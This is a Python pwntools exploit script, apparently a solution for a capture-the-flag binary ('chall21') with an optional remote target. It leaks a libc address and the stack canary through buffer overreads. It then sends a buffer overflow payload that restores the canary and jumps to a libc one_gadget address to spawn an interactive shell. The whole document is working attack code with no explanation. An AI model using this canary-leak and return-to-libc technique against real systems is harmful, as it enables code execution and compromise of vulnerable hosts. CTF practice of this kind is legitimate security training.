from pwn import *

e = ELF("./chall21")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("challenge.pwny.racing", 40021)
else:
  p = process(e.path)

p.recvuntil(":")
p.sendline("A" * 0x20)
p.recvuntil("A" * 0x20)

libc_leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7fe50932f9a0 + 0x00007fe508f2e000 
print("{:#x}".format(libc_leak))

p.recvuntil(":")
p.sendline("A" * (72 + 1))

p.recvuntil("A" * (72 + 1))
stk = "\x00" + p.recvline()[:7]

print(stk.encode("hex"))

p.recvuntil(":")
p.sendline("A" * 72 + stk + "A" * 8 + p64(libc_leak + 0x4f2c5))

p.sendline()
p.recvuntil("buffer: ")

p.interactive()
